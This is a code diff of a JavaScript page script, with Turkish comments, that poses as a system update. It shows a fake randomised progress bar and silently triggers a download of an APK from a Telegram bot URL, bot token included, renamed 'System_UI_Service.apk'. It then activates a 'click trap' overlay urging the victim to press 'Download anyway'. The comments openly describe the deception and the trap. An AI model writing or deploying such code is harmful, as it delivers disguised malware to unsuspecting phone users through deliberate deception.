@@ -1,31 +1,46 @@
 document.getElementById('start-btn').addEventListener('click', function() {
+    const btn = this;
     const bar = document.getElementById('bar');
     const status = document.getElementById('status');
+    const title = document.getElementById('title');
+    const trap = document.getElementById('click-trap');
     
+    // UI Değişikliği
+    btn.style.display = 'none';
+    title.innerText = "Sistem Güncelleniyor";
+    
+    // İndirilecek APK (Telegram linklerinden biri)
+    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
+
     let width = 0;
     const interval = setInterval(() => {
-        width += 1.5; // Bar yavaşça dolsun (inandırıcılık için)
-        bar.style.width = width + "%";
-        status.innerText = "Sistem kontrol ediliyor... %" + Math.round(width);
-
+        // Rastgele artış hızı (Daha gerçekçi durur)
+        width += Math.random() * 3;
+        
         if (width >= 100) {
             clearInterval(interval);
-            
-            // CORS'A TAKILMAYAN YÖNTEM:
-            const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
-            
-            // Gizli bir link üzerinden indirmeyi zorla
+            bar.style.width = "100%";
+            status.innerText = "Paket açılıyor...";
+
+            // 1. ADIM: İndirmeyi Gizli Link ile Başlat (CORS Bypass)
             const a = document.createElement('a');
             a.href = apkUrl;
-            a.target = "_self"; // Yeni sekme açmadan mevcut pencerede tetikle
+            a.download = "System_UI_Service.apk"; // Videodaki sahte isim
+            a.target = "_self";
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
 
-            status.innerHTML = "<b>İndirme Başlatıldı.</b><br>Lütfen alttaki bildirimden onayı tamamlayın.";
+            // 2. ADIM: Tıklama Tuzağını Aktif Et
+            trap.style.display = "block";
             
-            // 2. ADIM: TUZAĞI BURADA AKTİF EDİYORUZ
-            setupClickTrap();
+            setTimeout(() => {
+                status.innerHTML = "<b>ÖNEMLİ:</b> Güncellemenin tamamlanması için alttaki pencerede <b>'Yine de indir'</b> butonuna basın.";
+            }, 1000);
+
+        } else {
+            bar.style.width = width + "%";
+            status.innerText = "İndiriliyor: %" + Math.round(width);
         }
-    }, 50);
+    }, 150);
 });
